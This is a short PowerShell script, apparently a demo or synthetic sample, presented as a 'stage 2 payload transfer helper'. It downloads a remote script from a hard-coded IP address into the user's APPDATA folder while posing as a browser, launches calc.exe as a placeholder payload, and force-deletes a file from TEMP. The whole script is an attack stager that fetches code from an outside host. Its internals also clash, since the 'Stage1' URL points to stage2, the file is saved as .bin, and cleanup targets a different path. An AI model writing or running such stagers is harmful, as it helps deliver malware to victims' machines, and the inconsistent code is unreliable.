
<#
.SYNOPSIS
    Stage 2 payload transfer helper.

.DESCRIPTION
    Downloads the staged artefact to a per-user drop path.
    The destination is verified before the launcher runs.

.EXAMPLE
    PS> .\payload.ps1
#>
$Stage1Url = "https://203.0.113.172/stage2.ps1"
$WorkingPath = "$env:APPDATA\stage2.bin"
$ConnectionTimeout = 93
$RequestAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
$ErrorActionPreference = "Stop"

function Get-Stage2Payload {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$OperationResult = Get-Stage2Payload -SourceUrl $Stage1Url -DestinationPath $WorkingPath -TimeoutSec $ConnectionTimeout -UserAgent $RequestAgent
if ($OperationResult) {
    Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
}

$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
